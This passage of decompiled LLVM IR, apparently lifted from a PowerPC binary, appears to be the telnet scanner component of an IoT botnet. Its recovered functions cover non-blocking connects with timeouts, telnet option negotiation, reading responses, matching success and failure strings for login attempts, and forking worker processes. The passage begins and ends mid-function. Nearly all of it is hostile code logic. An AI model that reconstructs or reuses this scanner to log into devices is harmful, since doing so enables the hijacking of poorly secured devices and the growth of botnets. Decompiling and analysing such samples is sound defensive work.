dec_label_pc_10001d58.dec_label_pc_10001d58_crit_edge.dec_label_pc_10001d58.dec_label_pc_10001d58_crit_edge_crit_edge: ; preds = %dec_label_pc_10001d58.dec_label_pc_10001d58_crit_edge
  %v3_10001d5c.pre.pre = load i32, i32* %stack_var_-200, align 4
  br label %dec_label_pc_10001d58.dec_label_pc_10001d58_crit_edge

dec_label_pc_10001d88:                            ; preds = %dec_label_pc_10001d58.dec_label_pc_10001d58_crit_edge
  %v2_10001da4 = load i32, i32* %v1_10001ca8, align 4
  %v2_10001db8 = or i32 %v2_10001da4, %v3_10001cb8
  store i32 %v2_10001db8, i32* %v1_10001ca8, align 4
  store i32 268443132, i32* @lr, align 4
  %v5_10001df8 = call i32 @__libc_select(i32 %v1_10001cd8, i32 %v2_10001c48, i32 0, i32 %v2_10001c48, i32 %v2_10001ce4)
  %v2_10001e08 = icmp sgt i32 %v5_10001df8, 0
  br i1 %v2_10001e08, label %dec_label_pc_10001eb8.preheader, label %dec_label_pc_10001e10

dec_label_pc_10001e10:                            ; preds = %dec_label_pc_10001d88
  %v1_10001e14 = add nsw i32 %stack_var_-176.017, 1
  %tmp45 = icmp slt i32 %v1_10001e14, 10
  br i1 %tmp45, label %dec_label_pc_10001d18, label %dec_label_pc_10001eb8.preheader

dec_label_pc_10001eb8.preheader:                  ; preds = %dec_label_pc_10001e10, %dec_label_pc_10001d88, %dec_label_pc_10001e1c.preheader, %dec_label_pc_10001c8c
  %v2_10001e44 = ptrtoint i8* %stack_var_-32 to i32
  br label %dec_label_pc_10001eb8

dec_label_pc_10001e3c:                            ; preds = %dec_label_pc_10001eb8
  %v3_10001e40 = load i32, i32* @global_var_10024a20.27, align 4
  store i32 268443228, i32* @lr, align 4
  %v4_10001e58 = call i32 @__libc_recv(i32 %v3_10001e40, i32 %v2_10001e44, i32 1, i32 0)
  %v3_10001e60 = icmp eq i32 %v4_10001e58, 1
  br i1 %v3_10001e60, label %dec_label_pc_10001e80, label %dec_label_pc_10001e68

dec_label_pc_10001e68:                            ; preds = %dec_label_pc_10001e3c
  store i8 0, i8* %stack_var_-180.0, align 1
  br label %dec_label_pc_10001ef4

dec_label_pc_10001e80:                            ; preds = %dec_label_pc_10001e3c
  %v3_10001e80 = load i8, i8* %stack_var_-32, align 1
  %v4_10001e88 = ptrtoint i8* %stack_var_-180.0 to i32
  store i8 %v3_10001e80, i8* %stack_var_-180.0, align 1
  %v1_10001e94 = add i32 %v4_10001e88, 1
  %v5_10001e98 = inttoptr i32 %v1_10001e94 to i8*
  %v3_10001e9c = load i8, i8* %stack_var_-32, align 1
  %v3_10001ea4 = icmp eq i8 %v3_10001e9c, 10
  br i1 %v3_10001ea4, label %dec_label_pc_10001ee0, label %dec_label_pc_10001eac

dec_label_pc_10001eac:                            ; preds = %dec_label_pc_10001e80
  %v1_10001eb0 = add i32 %stack_var_-184.0, 1
  br label %dec_label_pc_10001eb8

dec_label_pc_10001eb8:                            ; preds = %dec_label_pc_10001eb8.preheader, %dec_label_pc_10001eac
  %stack_var_-180.0 = phi i8* [ %v5_10001e98, %dec_label_pc_10001eac ], [ %arg2, %dec_label_pc_10001eb8.preheader ]
  %stack_var_-184.0 = phi i32 [ %v1_10001eb0, %dec_label_pc_10001eac ], [ 0, %dec_label_pc_10001eb8.preheader ]
  %v0_10001ec0 = call i32 @__asm_mfcr()
  %v1_10001ec4 = call i32 @__asm_rlwinm(i32 %v0_10001ec0, i32 30, i32 31, i32 31)
  %v1_10001ec8 = urem i32 %v1_10001ec4, 256
  %v3_10001ed8 = icmp eq i32 %v1_10001ec8, 0
  br i1 %v3_10001ed8, label %dec_label_pc_10001ee0, label %dec_label_pc_10001e3c

dec_label_pc_10001ee0:                            ; preds = %dec_label_pc_10001eb8, %dec_label_pc_10001e80
  %stack_var_-180.1 = phi i8* [ %stack_var_-180.0, %dec_label_pc_10001eb8 ], [ %v5_10001e98, %dec_label_pc_10001e80 ]
  store i8 0, i8* %stack_var_-180.1, align 1
  br label %dec_label_pc_10001ef4

dec_label_pc_10001ef4:                            ; preds = %dec_label_pc_10001e68, %dec_label_pc_10001ee0
  %storemerge = phi i32 [ -1, %dec_label_pc_10001e68 ], [ %stack_var_-184.0, %dec_label_pc_10001ee0 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %stack_var_-180.0, { 3, 0, 1, 2 }
  uselistorder i8* %v5_10001e98, { 1, 0 }
  uselistorder i32 %v1_10001e14, { 1, 0 }
  uselistorder i32 %v1_10001d74, { 1, 0 }
  uselistorder i32 %v2_10001ce4, { 1, 0 }
  uselistorder i32* %v1_10001ca8, { 1, 2, 0, 3 }
  uselistorder i32 %storemerge618, { 1, 0 }
  uselistorder i32 %v2_10001c48, { 5, 4, 0, 6, 3, 2, 1 }
  uselistorder i32* %stack_var_-40, { 0, 2, 1 }
  uselistorder i8* %stack_var_-32, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10001ef4, { 1, 0 }
  uselistorder label %dec_label_pc_10001eb8, { 1, 0 }
  uselistorder label %dec_label_pc_10001d18, { 1, 0 }
  uselistorder label %dec_label_pc_10001c5c, { 1, 0 }
}

define i32 @get_telstate_host(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v1_10001f30 = add i32 %arg1, 4
  %v2_10001f30 = inttoptr i32 %v1_10001f30 to i32*
  %v3_10001f30 = load i32, i32* %v2_10001f30, align 4
  store i32 %v3_10001f30, i32* %stack_var_-20, align 4
  store i32 268443468, i32* @lr, align 4
  %v3_10001f48 = call i32 @__GI_inet_ntoa(i32* nonnull %stack_var_-20, i32 %arg1)
  ret i32 %v3_10001f48
}

define i32 @read_until_response(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg3 to i32
  store i32 268443564, i32* @lr, align 4
  %v4_10001fa8 = call i32 @__GI_memset(i32 %tmp, i32 0, i32 %arg4)
  %v5_10001fc0 = call i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %tmp, i32 %arg4)
  %v3_10001fd0 = load i8, i8* %arg3, align 1
  %v3_10001fd8 = icmp eq i8 %v3_10001fd0, -1
  br i1 %v3_10001fd8, label %dec_label_pc_10001fe0, label %dec_label_pc_10001ff4

dec_label_pc_10001fe0:                            ; preds = %entry
  store i32 268443636, i32* @lr, align 4
  %v6_10001ff0 = call i32 @negotiate(i32 %arg1, i32 %tmp, i32 3, i32 %tmp)
  br label %dec_label_pc_10001ff4

dec_label_pc_10001ff4:                            ; preds = %entry, %dec_label_pc_10001fe0
  %v3_10002000 = call i32 @contains_string(i32 %tmp, i32 %arg5)
  %v3_10002008 = icmp ne i32 %v3_10002000, 0
  %. = zext i1 %v3_10002008 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_10001ff4, { 1, 0 }
}

define i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %v2_10002078 = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_10002078, i32* %stack_var_-184, align 4
  store i32 0, i32* %stack_var_-176, align 4
  br label %dec_label_pc_1000208c.dec_label_pc_1000208c_crit_edge

dec_label_pc_1000208c.dec_label_pc_1000208c_crit_edge: ; preds = %dec_label_pc_1000208c.dec_label_pc_1000208c_crit_edge.dec_label_pc_1000208c.dec_label_pc_1000208c_crit_edge_crit_edge, %entry
  %v3_10002090.pre = phi i32 [ %v2_10002078, %entry ], [ %v3_10002090.pre.pre, %dec_label_pc_1000208c.dec_label_pc_1000208c_crit_edge.dec_label_pc_1000208c.dec_label_pc_1000208c_crit_edge_crit_edge ]
  %v1_100020a821 = phi i32 [ 1, %entry ], [ %v1_100020a8, %dec_label_pc_1000208c.dec_label_pc_1000208c_crit_edge.dec_label_pc_1000208c.dec_label_pc_1000208c_crit_edge_crit_edge ]
  %v1_10002094 = mul nuw nsw i32 %v1_100020a821, 4
  %v2_10002098 = add i32 %v1_10002094, %v3_10002090.pre
  %v2_100020a0 = inttoptr i32 %v2_10002098 to i32*
  store i32 0, i32* %v2_100020a0, align 4
  %v1_100020a8 = add nuw nsw i32 %v1_100020a821, 1
  %tmp19 = icmp ult i32 %v1_100020a8, 32
  br i1 %tmp19, label %dec_label_pc_1000208c.dec_label_pc_1000208c_crit_edge.dec_label_pc_1000208c.dec_label_pc_1000208c_crit_edge_crit_edge, label %dec_label_pc_100020bc

dec_label_pc_1000208c.dec_label_pc_1000208c_crit_edge.dec_label_pc_1000208c.dec_label_pc_1000208c_crit_edge_crit_edge: ; preds = %dec_label_pc_1000208c.dec_label_pc_1000208c_crit_edge
  %v3_10002090.pre.pre = load i32, i32* %stack_var_-184, align 4
  br label %dec_label_pc_1000208c.dec_label_pc_1000208c_crit_edge

dec_label_pc_100020bc:                            ; preds = %dec_label_pc_1000208c.dec_label_pc_1000208c_crit_edge
  %v1_100020c0 = udiv i32 %arg1, 32
  %v1_100020c8 = mul nuw nsw i32 %v1_100020c0, 4
  %v2_100020cc = ptrtoint i32* %stack_var_-184 to i32
  %v2_100020d0 = add nuw nsw i32 %v1_100020c8, 8
  %v1_100020d4 = add i32 %v2_100020d0, %v2_100020cc
  %v1_100020d8 = inttoptr i32 %v1_100020d4 to i32*
  %v2_100020d8 = load i32, i32* %v1_100020d8, align 4
  %v1_100020e0 = urem i32 %arg1, 32
  %v3_100020e8 = shl i32 1, %v1_100020e0
  %v2_100020ec = or i32 %v2_100020d8, %v3_100020e8
  store i32 %v2_100020ec, i32* %v1_100020d8, align 4
  %v1_10002108 = add i32 %arg1, 1
  %v2_10002110 = ptrtoint i32* %stack_var_-48 to i32
  store i32 268443948, i32* @lr, align 4
  %v5_10002128 = call i32 @__libc_select(i32 %v1_10002108, i32 %v2_10002078, i32 0, i32 0, i32 %v2_10002110)
  %v2_10002130 = icmp sgt i32 %v5_10002128, 0
  br i1 %v2_10002130, label %dec_label_pc_10002144, label %dec_label_pc_10002164

dec_label_pc_10002144:                            ; preds = %dec_label_pc_100020bc
  store i32 268443996, i32* @lr, align 4
  %v4_10002158 = call i32 @__libc_recv(i32 %arg1, i32 %arg3, i32 %arg4, i32 0)
  br label %dec_label_pc_10002164

dec_label_pc_10002164:                            ; preds = %dec_label_pc_100020bc, %dec_label_pc_10002144
  %storemerge = phi i32 [ %v4_10002158, %dec_label_pc_10002144 ], [ 0, %dec_label_pc_100020bc ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_100020a8, { 1, 0 }
  uselistorder i32 %v2_10002078, { 1, 0, 2 }
  uselistorder i32* %stack_var_-184, { 2, 0, 1 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_10002164, { 1, 0 }
}

define i32 @advance_state(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_100021a4 = icmp eq i32 %arg2, 0
  br i1 %v3_100021a4, label %dec_label_pc_100021ac, label %dec_label_pc_100021bc

dec_label_pc_100021ac:                            ; preds = %entry
  %v2_100021b0 = load i32, i32* %arg1, align 4
  store i32 268444092, i32* @lr, align 4
  %v1_100021b8 = call i32 @__libc_close(i32 %v2_100021b0)
  br label %dec_label_pc_100021bc

dec_label_pc_100021bc:                            ; preds = %entry, %dec_label_pc_100021ac
  %v2_100021c4 = add i32 %tmp, 16
  %v3_100021c4 = inttoptr i32 %v2_100021c4 to i32*
  store i32 0, i32* %v3_100021c4, align 4
  %v1_100021d4 = trunc i32 %arg2 to i8
  %v3_100021d4 = add i32 %tmp, 8
  %v4_100021d4 = inttoptr i32 %v3_100021d4 to i8*
  store i8 %v1_100021d4, i8* %v4_100021d4, align 1
  %v1_100021dc = add i32 %tmp, 24
  %v2_100021dc = inttoptr i32 %v1_100021dc to i32*
  %v3_100021dc = load i32, i32* %v2_100021dc, align 4
  store i32 268444148, i32* @lr, align 4
  %v3_100021f0 = call i32 @__GI_memset(i32 %v3_100021dc, i32 0, i32 1024)
  ret i32 %v3_100021f0

; uselistorder directives
  uselistorder label %dec_label_pc_100021bc, { 1, 0 }
}

define i32 @reset_telstate(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_1000222c = inttoptr i32 %arg1 to i32*
  %v3_1000222c = call i32 @advance_state(i32* %v2_1000222c, i32 0)
  %v3_10002238 = add i32 %arg1, 9
  %v4_10002238 = inttoptr i32 %v3_10002238 to i8*
  store i8 1, i8* %v4_10002238, align 1
  ret i32 %v3_1000222c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @contains_success(i32 %arg1) local_unnamed_addr {
entry:
  %v3_1000227c = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([3 x i8*]* @global_var_10024668.33 to i32))
  ret i32 %v3_1000227c
}

define i32 @contains_fail(i32 %arg1) local_unnamed_addr {
entry:
  %v3_100022c8 = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([7 x i8*]* @global_var_10024648.41 to i32))
  ret i32 %v3_100022c8

; uselistorder directives
  uselistorder i32 (i32, i32)* @contains_string, { 2, 1, 0 }
}

define i32 @contains_response(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268444428, i32* @lr, align 4
  %v1_10002308 = call i32 @contains_success(i32 %arg1)
  %v3_10002310 = icmp eq i32 %v1_10002308, 0
  br i1 %v3_10002310, label %dec_label_pc_10002318, label %dec_label_pc_10002340

dec_label_pc_10002318:                            ; preds = %entry
  store i32 268444448, i32* @lr, align 4
  %v1_1000231c = call i32 @contains_fail(i32 %arg1)
  %v3_10002324 = icmp ne i32 %v1_1000231c, 0
  %. = zext i1 %v3_10002324 to i32
  br label %dec_label_pc_10002340

dec_label_pc_10002340:                            ; preds = %dec_label_pc_10002318, %entry
  %storemerge = phi i32 [ 1, %entry ], [ %., %dec_label_pc_10002318 ]
  ret i32 %storemerge
}

define i32 @contains_string(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  br label %dec_label_pc_10002394

dec_label_pc_10002394:                            ; preds = %dec_label_pc_10002394, %entry
  %stack_var_-36.0 = phi i32 [ 0, %entry ], [ %v1_10002398, %dec_label_pc_10002394 ]
  %v1_10002398 = add i32 %stack_var_-36.0, 1
  %v1_100023a4 = mul i32 %v1_10002398, 4
  %v2_100023b0 = add i32 %v1_100023a4, %arg2
  %v1_100023b4 = inttoptr i32 %v2_100023b0 to i32*
  %v2_100023b4 = load i32, i32* %v1_100023b4, align 4
  %v3_100023b8 = icmp eq i32 %v2_100023b4, 0
  br i1 %v3_100023b8, label %dec_label_pc_10002418.preheader, label %dec_label_pc_10002394

dec_label_pc_10002418.preheader:                  ; preds = %dec_label_pc_10002394
  %v2_100024204 = icmp sgt i32 %v1_10002398, 0
  br i1 %v2_100024204, label %dec_label_pc_100023cc.lr.ph, label %dec_label_pc_10002430

dec_label_pc_100023cc.lr.ph:                      ; preds = %dec_label_pc_10002418.preheader
  %v3_100023f0 = inttoptr i32 %arg1 to i8*
  br label %dec_label_pc_100023cc

dec_label_pc_100023cc:                            ; preds = %dec_label_pc_100023cc.lr.ph, %dec_label_pc_1000240c
  %storemerge27 = phi i32 [ 0, %dec_label_pc_100023cc.lr.ph ], [ %v1_10002410, %dec_label_pc_1000240c ]
  %v1_100023d0 = mul i32 %storemerge27, 4
  %v2_100023dc = add i32 %v1_100023d0, %arg2
  %v1_100023e0 = inttoptr i32 %v2_100023dc to i32*
  %v2_100023e0 = load i32, i32* %v1_100023e0, align 4
  store i32 268444660, i32* @lr, align 4
  %v4_100023f0 = call i32 @strcasestr(i8* %v3_100023f0, i32 %v2_100023e0, i32 %v2_100023dc)
  %v3_100023f8 = icmp eq i32 %v4_100023f0, 0
  br i1 %v3_100023f8, label %dec_label_pc_1000240c, label %dec_label_pc_10002430.loopexit

dec_label_pc_1000240c:                            ; preds = %dec_label_pc_100023cc
  %v1_10002410 = add nuw nsw i32 %storemerge27, 1
  %v2_10002420 = icmp slt i32 %v1_10002410, %v1_10002398
  br i1 %v2_10002420, label %dec_label_pc_100023cc, label %dec_label_pc_10002430.loopexit

dec_label_pc_10002430.loopexit:                   ; preds = %dec_label_pc_1000240c, %dec_label_pc_100023cc
  %storemerge.ph = phi i32 [ 1, %dec_label_pc_100023cc ], [ 0, %dec_label_pc_1000240c ]
  br label %dec_label_pc_10002430

dec_label_pc_10002430:                            ; preds = %dec_label_pc_10002430.loopexit, %dec_label_pc_10002418.preheader
  %storemerge = phi i32 [ 0, %dec_label_pc_10002418.preheader ], [ %storemerge.ph, %dec_label_pc_10002430.loopexit ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge27, { 1, 0 }
  uselistorder i32 %v1_10002398, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_100023cc, { 1, 0 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  store i32 268444808, i32* @lr, align 4
  %v2_10002484 = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  store i32 ptrtoint (i32* @global_var_100024b0.42 to i32), i32* @lr, align 4
  %v2_100024ac = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  store i32 2, i32* %stack_var_-200, align 4
  %v1_100024bc = urem i32 %arg3, 65536
  store i32 %v1_100024bc, i32* @r3, align 4
  %v1_100024c4 = call i32 @htons(i32 %v1_100024bc)
  %v2_100024d4 = ptrtoint i32* %stack_var_-200 to i32
  %v4_100024e4 = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-196, i32 %v2_100024d4)
  %v3_100024ec = icmp eq i32 %v4_100024e4, 0
  br i1 %v3_100024ec, label %dec_label_pc_10002500, label %dec_label_pc_100024f4

dec_label_pc_100024f4:                            ; preds = %entry
  br label %dec_label_pc_100026c0

dec_label_pc_10002500:                            ; preds = %entry
  store i32 268444972, i32* @lr, align 4
  %v3_10002528 = call i32 @__libc_connect(i32 %arg1, i32 %v2_100024d4, i32 16)
  %tmp26 = icmp sgt i32 %v3_10002528, -1
  br i1 %tmp26, label %dec_label_pc_1000267c, label %dec_label_pc_10002540

dec_label_pc_10002540:                            ; preds = %dec_label_pc_10002500
  %v0_10002540 = call i32 @__errno_location()
  %v1_10002548 = inttoptr i32 %v0_10002540 to i32*
  %v2_10002548 = load i32, i32* %v1_10002548, align 4
  %v3_1000254c = icmp eq i32 %v2_10002548, 115
  br i1 %v3_1000254c, label %dec_label_pc_10002554, label %dec_label_pc_10002670

dec_label_pc_10002554:                            ; preds = %dec_label_pc_10002540
  store i32 %arg4, i32* %stack_var_-56, align 4
  %v2_10002564 = ptrtoint i32* %stack_var_-184 to i32
  store i32 %v2_10002564, i32* %stack_var_-216, align 4
  store i32 0, i32* %stack_var_-184, align 4
  br label %dec_label_pc_10002578.dec_label_pc_10002578_crit_edge

dec_label_pc_10002578.dec_label_pc_10002578_crit_edge: ; preds = %dec_label_pc_10002578.dec_label_pc_10002578_crit_edge.dec_label_pc_10002578.dec_label_pc_10002578_crit_edge_crit_edge, %dec_label_pc_10002554
  %v3_1000257c.pre = phi i32 [ %v2_10002564, %dec_label_pc_10002554 ], [ %v3_1000257c.pre.pre, %dec_label_pc_10002578.dec_label_pc_10002578_crit_edge.dec_label_pc_10002578.dec_label_pc_10002578_crit_edge_crit_edge ]
  %v1_1000259430 = phi i32 [ 1, %dec_label_pc_10002554 ], [ %v1_10002594, %dec_label_pc_10002578.dec_label_pc_10002578_crit_edge.dec_label_pc_10002578.dec_label_pc_10002578_crit_edge_crit_edge ]
  %v1_10002580 = mul nuw nsw i32 %v1_1000259430, 4
  %v2_10002584 = add i32 %v1_10002580, %v3_1000257c.pre
  %v2_1000258c = inttoptr i32 %v2_10002584 to i32*
  store i32 0, i32* %v2_1000258c, align 4
  %v1_10002594 = add nuw nsw i32 %v1_1000259430, 1
  %tmp27 = icmp ult i32 %v1_10002594, 32
  br i1 %tmp27, label %dec_label_pc_10002578.dec_label_pc_10002578_crit_edge.dec_label_pc_10002578.dec_label_pc_10002578_crit_edge_crit_edge, label %dec_label_pc_100025a8

dec_label_pc_10002578.dec_label_pc_10002578_crit_edge.dec_label_pc_10002578.dec_label_pc_10002578_crit_edge_crit_edge: ; preds = %dec_label_pc_10002578.dec_label_pc_10002578_crit_edge
  %v3_1000257c.pre.pre = load i32, i32* %stack_var_-216, align 4
  br label %dec_label_pc_10002578.dec_label_pc_10002578_crit_edge

dec_label_pc_100025a8:                            ; preds = %dec_label_pc_10002578.dec_label_pc_10002578_crit_edge
  %v1_100025ac = udiv i32 %arg1, 32
  %v1_100025b4 = mul nuw nsw i32 %v1_100025ac, 4
  %v2_100025b8 = ptrtoint i32* %stack_var_-216 to i32
  %v2_100025bc = add nuw nsw i32 %v1_100025b4, 32
  %v1_100025c0 = add i32 %v2_100025bc, %v2_100025b8
  %v1_100025c4 = inttoptr i32 %v1_100025c0 to i32*
  %v2_100025c4 = load i32, i32* %v1_100025c4, align 4
  %v1_100025cc = urem i32 %arg1, 32
  %v3_100025d4 = shl i32 1, %v1_100025cc
  %v2_100025d8 = or i32 %v2_100025c4, %v3_100025d4
  store i32 %v2_100025d8, i32* %v1_100025c4, align 4
  %v1_100025f4 = add i32 %arg1, 1
  %v2_100025fc = ptrtoint i32* %stack_var_-56 to i32
  store i32 268445208, i32* @lr, align 4
  %v5_10002614 = call i32 @__libc_select(i32 %v1_100025f4, i32 0, i32 %v2_10002564, i32 0, i32 %v2_100025fc)
  %tmp28 = icmp slt i32 %v5_10002614, 1
  br i1 %tmp28, label %dec_label_pc_10002664, label %dec_label_pc_10002624

dec_label_pc_10002624:                            ; preds = %dec_label_pc_100025a8
  store i32 4, i32* %stack_var_-48, align 4
  %v2_1000262c = ptrtoint i32* %stack_var_-44 to i32
  %v2_10002630 = ptrtoint i32* %stack_var_-48 to i32
  store i32 268445260, i32* @lr, align 4
  %v5_10002648 = call i32 @getsockopt(i32 %arg1, i32 1, i32 4, i32 %v2_1000262c, i32 %v2_10002630)
  %v3_1000264c = load i32, i32* %stack_var_-44, align 4
  %v3_10002650 = icmp eq i32 %v3_1000264c, 0
  br i1 %v3_10002650, label %dec_label_pc_1000267c, label %dec_label_pc_10002658

dec_label_pc_10002658:                            ; preds = %dec_label_pc_10002624
  br label %dec_label_pc_100026c0

dec_label_pc_10002664:                            ; preds = %dec_label_pc_100025a8
  br label %dec_label_pc_100026c0

dec_label_pc_10002670:                            ; preds = %dec_label_pc_10002540
  br label %dec_label_pc_100026c0

dec_label_pc_1000267c:                            ; preds = %dec_label_pc_10002624, %dec_label_pc_10002500
  store i32 268445328, i32* @lr, align 4
  %v2_1000268c = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_1000269c = call i32 @__asm_rlwinm(i32 %v2_1000268c, i32 0, i32 21, i32 19)
  store i32 ptrtoint (i32* @global_var_100026b8.43 to i32), i32* @lr, align 4
  %v2_100026b4 = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  br label %dec_label_pc_100026c0

dec_label_pc_100026c0:                            ; preds = %dec_label_pc_10002670, %dec_label_pc_10002664, %dec_label_pc_10002658, %dec_label_pc_100024f4, %dec_label_pc_1000267c
  %stack_var_-24.0 = phi i32 [ 1, %dec_label_pc_1000267c ], [ 0, %dec_label_pc_10002664 ], [ 0, %dec_label_pc_10002658 ], [ 0, %dec_label_pc_10002670 ], [ 0, %dec_label_pc_100024f4 ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32 %v1_10002594, { 1, 0 }
  uselistorder i32 %v2_10002564, { 1, 0, 2 }
  uselistorder i32 %v2_100024d4, { 1, 0 }
  uselistorder i32 %v1_100024bc, { 1, 0 }
  uselistorder i32* %stack_var_-200, { 1, 0 }
  uselistorder i32* %stack_var_-216, { 2, 0, 1 }
  uselistorder i32* %stack_var_-56, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32 %arg1, { 4, 5, 2, 3, 1, 0, 6, 7, 8 }
  uselistorder label %dec_label_pc_100026c0, { 4, 0, 1, 2, 3 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  store i32 268445432, i32* @lr, align 4
  %v0_100026f4 = call i32 @__libc_fork()
  %v3_10002704 = icmp eq i32 %v0_100026f4, 0
  br i1 %v3_10002704, label %dec_label_pc_10002888, label %dec_label_pc_10002718

dec_label_pc_10002718:                            ; preds = %entry
  %v3_10002720 = load i32, i32* @global_var_10024a2c.45, align 4
  %v2_10002724 = load i32, i32* @global_var_10024a28.44, align 4
  %v1_10002728 = add i32 %v3_10002720, 1
  %v2_10002728 = icmp eq i32 %v3_10002720, -1
  %v2_1000272c = zext i1 %v2_10002728 to i32
  %v3_1000272c = add i32 %v2_1000272c, %v2_10002724
  store i32 %v3_1000272c, i32* @global_var_10024a28.44, align 4
  store i32 %v1_10002728, i32* @global_var_10024a2c.45, align 4
  %v1_1000275c = mul i32 %v1_10002728, 4
  %v1_10002764 = add i32 %v1_1000275c, 4
  store i32 %v1_10002764, i32* @r3, align 4
  store i32 268445552, i32* @lr, align 4
  %v0_1000276c = call i32 @malloc()
  br label %dec_label_pc_100027c4

dec_label_pc_10002784:                            ; preds = %dec_label_pc_100027c4, %dec_label_pc_10002814
  %v1_10002788 = mul i32 %storemerge2, 4
  %v2_10002794 = add i32 %v1_10002788, %v0_1000276c
  %v3_100027a8 = load i32, i32* @global_var_10024a54.46, align 4
  %v2_100027ac = add i32 %v3_100027a8, %v1_10002788
  %v1_100027b0 = inttoptr i32 %v2_100027ac to i32*
  %v2_100027b0 = load i32, i32* %v1_100027b0, align 4
  %v2_100027b4 = inttoptr i32 %v2_10002794 to i32*
  store i32 %v2_100027b0, i32* %v2_100027b4, align 4
  %v1_100027bc = add i32 %storemerge2, 1
  br label %dec_label_pc_100027c4

dec_label_pc_100027c4:                            ; preds = %dec_label_pc_10002718, %dec_label_pc_10002784
  %storemerge2 = phi i32 [ 0, %dec_label_pc_10002718 ], [ %v1_100027bc, %dec_label_pc_10002784 ]
  %v3_100027ec = load i32, i32* @global_var_10024a2c.45, align 4
  %v2_100027f0 = load i32, i32* @global_var_10024a28.44, align 4
  %v2_100027f4 = icmp ne i32 %v3_100027ec, 0
  %v3_100027f8 = add i32 %v2_100027f0, -1
  %v4_100027f8 = sext i1 %v2_100027f4 to i32
  %v3_1000280c = icmp eq i32 %v3_100027f8, %v4_100027f8
  br i1 %v3_1000280c, label %dec_label_pc_10002814, label %dec_label_pc_10002784

dec_label_pc_10002814:                            ; preds = %dec_label_pc_100027c4
  %v1_100027f4 = add i32 %v3_100027ec, -1
  %v3_1000282c = icmp ugt i32 %v1_100027f4, %storemerge2
  br i1 %v3_1000282c, label %dec_label_pc_10002784, label %dec_label_pc_10002834

dec_label_pc_10002834:                            ; preds = %dec_label_pc_10002814
  %v1_10002848 = mul i32 %v3_100027ec, 4
  %v2_10002854 = add i32 %v0_1000276c, -4
  %v1_10002858 = add i32 %v2_10002854, %v1_10002848
  %v2_10002860 = inttoptr i32 %v1_10002858 to i32*
  store i32 %v0_100026f4, i32* %v2_10002860, align 4
  %v3_10002868 = load i32, i32* @global_var_10024a54.46, align 4
  store i32 %v3_10002868, i32* @r3, align 4
  store i32 268445812, i32* @lr, align 4
  %v0_10002870 = call i32 @free()
  store i32 %v0_1000276c, i32* @global_var_10024a54.46, align 4
  br label %dec_label_pc_10002888

dec_label_pc_10002888:                            ; preds = %entry, %dec_label_pc_10002834
  ret i32 %v0_100026f4

; uselistorder directives
  uselistorder i32 %storemerge2, { 1, 0, 2 }
  uselistorder i32 %v1_10002788, { 1, 0 }
  uselistorder i32 %v0_1000276c, { 1, 2, 0 }
  uselistorder i32 %v3_10002720, { 1, 0 }
  uselistorder label %dec_label_pc_10002888, { 1, 0 }
  uselistorder label %dec_label_pc_100027c4, { 1, 0 }
  uselistorder label %dec_label_pc_10002784, { 1, 0 }
}

define i32 @negotiate(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i8, align 1
  %v1_100028cc = add i32 %arg2, 1
  %v1_100028d0 = inttoptr i32 %v1_100028cc to i8*
  %v2_100028d0 = load i8, i8* %v1_100028d0, align 1
  %v1_100028e0 = icmp ult i8 %v2_100028d0, -5
  br i1 %v1_100028e0, label %dec_label_pc_10002a38, label %dec_label_pc_100028e8

dec_label_pc_100028e8:                            ; preds = %entry
  %v2_100028ec = icmp eq i8 %v2_100028d0, -1
  br i1 %v2_100028ec, label %dec_label_pc_100028f4, label %dec_label_pc_10002910

dec_label_pc_100028f4:                            ; preds = %dec_label_pc_100028e8
  br label %dec_label_pc_10002a38

dec_label_pc_10002910:                            ; preds = %dec_label_pc_100028e8
  store i8 -1, i8* %stack_var_-56, align 1
  %v2_1000291c = ptrtoint i8* %stack_var_-56 to i32
  store i32 268446000, i32* @lr, align 4
  %v4_1000292c = call i32 @__libc_send(i32 %arg1, i32 %v2_1000291c, i32 1, i32 16384)
